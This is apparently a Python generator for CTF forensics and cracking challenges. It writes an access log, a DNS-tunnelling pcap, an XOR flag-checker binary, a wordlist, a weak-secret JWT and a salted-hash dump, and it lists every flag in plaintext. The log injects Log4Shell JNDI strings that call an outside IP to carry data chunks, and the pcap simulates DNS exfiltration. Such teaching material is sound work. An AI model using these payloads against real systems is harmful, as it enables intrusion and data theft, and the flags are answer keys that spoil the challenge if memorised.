"""Generate CVE-tier (INSANE) challenge artifacts for JATIM CYBERSEC CTF ARENA."""
import base64, hashlib, json, pickle, random, struct, subprocess
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "public"

FLAGS = {
    "log4shell-aftermath": "JTCS{l0g4sh3ll_jnd1_3xf1l}",
    "silent-exfil":        "JTCS{dn5_tunn3l1ng_1n_th3_w1r3}",
    "petra-binary":        "JTCS{gh1dr4_wh1sp3rs_th3_byt3s}",
    "rogue-token":         "JTCS{m4j4p4h1t_r4j4}",
    "shadow-leak":         "JTCS{sup3rs3cr3t_p4ssw0rd}",
    "evil-pickle":         "JTCS{uns4f3_d3s3r1al1z4t10n_ftw}",
}
hashes = {k: hashlib.sha256(v.encode()).hexdigest() for k, v in FLAGS.items()}
print("CVE-TIER FLAG HASHES:")
print(json.dumps(hashes, indent=2))

rng = random.Random(1337)

# ============================================================
# CH7 — Log4Shell aftermath: access.log dengan JNDI exfil chunks
# ============================================================
flag7 = FLAGS["log4shell-aftermath"]
b64_flag = base64.b64encode(flag7.encode()).decode()  # e.g. SlRDU3s...=
CHUNK = 6
chunks = [b64_flag[i:i+CHUNK] for i in range(0, len(b64_flag), CHUNK)]

uas_normal = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "curl/7.79.1", "okhttp/4.9.3", "python-requests/2.28.1",
]
paths = ["/", "/index.html", "/api/v1/status", "/login", "/static/app.js",
         "/products", "/api/v1/orders", "/health", "/favicon.ico"]

lines = []
t0 = datetime(2026, 8, 14, 3, 12, 0)
total = 2400
attack_at = sorted(rng.sample(range(400, total - 200), len(chunks)))
attack_map = dict(zip(attack_at, range(len(chunks))))

for i in range(total):
    ts = t0 + timedelta(seconds=i * rng.randint(4, 19))
    stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0700")
    if i in attack_map:
        idx = attack_map[i]
        ua = "${jndi:ldap://185.220.101.47:1389/part%02dof%02d-%s}" % (
            idx + 1, len(chunks), chunks[idx])
        ip, path, code = "185.220.101.47", "/api/v1/login", 200
    else:
        ua = rng.choice(uas_normal)
        ip = f"103.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}"
        path = rng.choice(paths)
        code = rng.choice([200, 200, 200, 301, 404, 500])
    lines.append(f'{ip} - - [{stamp}] "GET {path} HTTP/1.1" {code} '
                 f'{rng.randint(200, 9000)} "-" "{ua}"')
(OUT / "files" / "breach-access.log").write_text("\n".join(lines) + "\n")

# ============================================================
# CH8 — silent-exfil.pcap : DNS tunneling, label base32
# ============================================================
flag8 = FLAGS["silent-exfil"]
b32 = base64.b32encode(flag8.encode()).decode().rstrip("=")
LBL = 13
labels = [b32[i:i+LBL] for i in range(0, len(b32), LBL)]

def ip_checksum(h: bytes) -> int:
    if len(h) % 2: h += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(h)//2), h))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def dns_query(qname: str, tid: int) -> bytes:
    q = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for part in qname.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00" + struct.pack("!HH", 1, 1)
    return q

def packet(qname: str, tid: int, src_ip: str, dst_ip: str) -> bytes:
    dns = dns_query(qname, tid)
    udp = struct.pack("!HHHH", 53312, 53, 8 + len(dns), 0) + dns
    ihl_ver, tos = 0x45, 0
    tot = 20 + len(udp)
    iph = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tot, tid, 0, 64, 17, 0,
                      bytes(map(int, src_ip.split("."))),
                      bytes(map(int, dst_ip.split("."))))
    csum = ip_checksum(iph)
    iph = iph[:10] + struct.pack("!H", csum) + iph[12:]
    eth = b"\x02\x00\x5e\x10\x20\x30" + b"\x02\x00\x0c\x29\x44\x55" + b"\x08\x00"
    return eth + iph + udp

pkts = []
ts = 1755130000
tid = 0x1000
# decoy noise
decoys = ["www.google.com", "cdn.cloudflare.net", "update.microsoft.com",
          "mail.yahoo.com", "api.github.com"]
for i in range(60):
    pkts.append((ts, packet(rng.choice(decoys), tid, "192.168.1.10", "8.8.8.8")))
    tid += 1; ts += rng.randint(1, 5)
    if i % 4 == 1 and (i // 4) < len(labels):
        idx = i // 4
        qn = f"{labels[idx]}.{idx:02d}.exfil.mjpt-legacy.net"
        pkts.append((ts, packet(qn, tid, "192.168.1.10", "8.8.8.8")))
        tid += 1; ts += rng.randint(1, 3)

pcap = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
for t, p in pkts:
    pcap += struct.pack("<IIII", t, 0, len(p), len(p)) + p
(OUT / "files" / "silent-exfil.pcap").write_bytes(pcap)

# ============================================================
# CH9 — petra.c -> binary Mach-O, flag XOR dengan rolling key
# ============================================================
flag9 = FLAGS["petra-binary"]
key9 = "p3tr4s1l4n"
enc = [ord(c) ^ ord(key9[(i * 7) % len(key9)]) for i, c in enumerate(flag9)]
c_src = f'''#include <stdio.h>
#include <string.h>

static unsigned char enc[{len(enc)}] = {{{", ".join(map(str, enc))}}};
static const char key[] = "{key9}";

int main(int argc, char **argv) {{
    if (argc != 2) {{ fprintf(stderr, "usage: ./petra <flag>\\n"); return 1; }}
    size_t n = strlen(argv[1]);
    if (n != sizeof(enc)) {{ fprintf(stderr, "ditolak.\\n"); return 1; }}
    for (size_t i = 0; i < n; i++) {{
        unsigned char k = (unsigned char)key[(i * 7) % (sizeof(key) - 1)];
        if (((unsigned char)argv[1][i] ^ k) != enc[i]) {{
            fprintf(stderr, "ditolak.\\n");
            return 1;
        }}
    }}
    puts("diterima. bendera valid.");
    return 0;
}}
'''
(ROOT / "tools" / "petra.c").write_text(c_src)
subprocess.run(["clang", "-O2", "-o", str(OUT / "files" / "petra"),
                str(ROOT / "tools" / "petra.c")], check=True)
print("petra binary compiled OK")

# ============================================================
# Wordlist bersama untuk CH10 & CH11
# ============================================================
base_words = ["surabaya", "malang", "kediri", "jember", "banyuwangi", "madura",
              "arek", "rek", "cak", "ning", "jatim", "cyber", "hacker", "sandi",
              "rahasia", "bendera", "merah", "putih", "bromo", "semeru", "ijen",
              "rawon", "rujak", "sate", "gudeg", "tahu", "tek", "petra", "kera"]
words = set()
for w in base_words:
    for suf in ["", "123", "2024", "2025", "2026", "!", "99", "01", "07", "45",
                "_id", "_jt", "88", "77", "666", "1337"]:
        words.add(w + suf)
        words.add(w.capitalize() + suf)
words = sorted(words)
rng.shuffle(words)
words = words[:2400]
words.insert(rng.randint(0, len(words)), "m4j4p4h1t_r4j4")   # JWT secret
words.insert(rng.randint(0, len(words)), "sup3rs3cr3t_p4ssw0rd")  # shadow pass
(OUT / "files" / "rockyou-jatim.txt").write_text("\n".join(words) + "\n")

# ============================================================
# CH10 — rogue-token: JWT HS256 dengan secret lemah
# ============================================================
import hmac as hmac_mod
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
payload = base64.urlsafe_b64encode(
    b'{"sub":"peserta-077","role":"user","iss":"jatim-cybersec-auth","iat":1755130000,'
    b'"note":"admin role unlocks /api/flag"}').rstrip(b"=").decode()
secret10 = "m4j4p4h1t_r4j4"
sig = base64.urlsafe_b64encode(
    hmac_mod.new(secret10.encode(), f"{header}.{payload}".encode(),
                 hashlib.sha256).digest()).rstrip(b"=").decode()
(OUT / "vault" / "captured-token.txt").write_text(
    "TOKEN HASIL INTERSEPSI — sesi admin tertangkap di jaringan kafe\n"
    "=============================================================\n\n"
    f"{header}.{payload}.{sig}\n\n"
    "catatan analis: secret HMAC lemah, kemungkinan ada di wordlist lokal.\n"
)
print("JWT:", f"{header}.{payload}.{sig}")

# ============================================================
# CH11 — shadow-leak: sha256($pass.$salt), hashcat mode 1410
# ============================================================
salt11 = "JTCS2026"
pass11 = "sup3rs3cr3t_p4ssw0rd"
h11 = hashlib.sha256((pass11 + salt11).encode()).hexdigest()
(OUT / "vault" / "shadow-leak.txt").write_text(
    "DUMP DATABASE — tabel users (format: user:hash:salt)\n"
    "====================================================\n\n"
    f"admin:{h11}:{salt11}\n"
    f"operator:{hashlib.sha256(('k3r4s4kt1' + salt11).encode()).hexdigest()}:{salt11}\n"
    f"guest:{hashlib.sha256(('t4hut3k' + salt11).encode()).hexdigest()}:{salt11}\n"
    "\nalgoritma: sha256($pass.$salt) — hashcat mode 1410 / john dynamic\n"
)
print("shadow admin hash:", h11)

# ============================================================
# CH12 — evil-pickle: serialized object berisi blob XOR 0x42
# ============================================================
flag12 = FLAGS["evil-pickle"]
blob = bytes(b ^ 0x42 for b in flag12.encode())
obj = {
    "module": "jtcs.legacy.sync",
    "version": "0.9.1",
    "payload": blob,
    "note": "legacy sync blob — jangan di-load tanpa sandbox",
    "checksum": hashlib.md5(blob).hexdigest(),
}
p12 = base64.b64encode(pickle.dumps(obj, protocol=2)).decode()
(OUT / "files" / "payload.b64.txt").write_text(
    "SERIALIZED OBJECT (base64) — ditemukan di server produksi yang diretas\n"
    "=====================================================================\n\n"
    f"{p12}\n"
)

print("\nDone. CVE-tier artifacts written.")
